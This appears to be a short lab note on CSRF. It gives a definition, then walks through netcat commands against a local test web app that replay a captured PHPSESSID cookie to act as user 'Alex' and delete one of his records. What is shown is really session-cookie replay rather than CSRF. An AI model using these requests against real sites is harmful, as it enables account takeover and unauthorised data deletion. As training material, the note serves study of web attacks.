 CSRF (Cross Site Request Forgery)

A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the
victim’s session cookie and any other automatically included authentication information, to a
vulnerable web application. This allows the attacker to force the victim’s browser to generate
requests the vulnerable application thinks are legitimate requests from the victim.

http://192.168.10.100/fourFours/index.php?operation=login&user=bigBoy&password=sdfdsfd


nc 192.168.10.100 80
GET /fourFours/index.php HTTP/1.0
Cookie: PHPSESSID=9dc405ff3e487754aaea8596e97bf3d4;

or

nc 192.168.10.100 80 > netcat_useCookie_get_user_alex.txt  2>&1
GET /fourFours/index.php HTTP/1.0
Cookie: PHPSESSID=9dc405ff3e487754aaea8596e97bf3d4;


and in netcat_useCookie_get_user_alex.txt we can see that we are logged in as Alex.

We can see one of his expressions and the url to delete it:
    ?operation=deleteExpression&expressionId=34&accountId=1

So if we append this to the url in the netcat request it should delete that expression

nc 192.168.10.100 80 > delete_Alex_expression.txt  2>&1
GET /fourFours/index.php?operation=deleteExpression&expressionId=34&accountId=1 HTTP/1.0
Cookie: PHPSESSID=9dc405ff3e487754aaea8596e97bf3d4;

And if we look at delete_Alex_expression.txt we can see that expression is gone.

we can also reload the page just in case:

nc 192.168.10.100 80 > netcat_useCookie_get_user_alex2.txt  2>&1
GET /fourFours/index.php HTTP/1.0
Cookie: PHPSESSID=9dc405ff3e487754aaea8596e97bf3d4;

And we can see that the expression is gone.
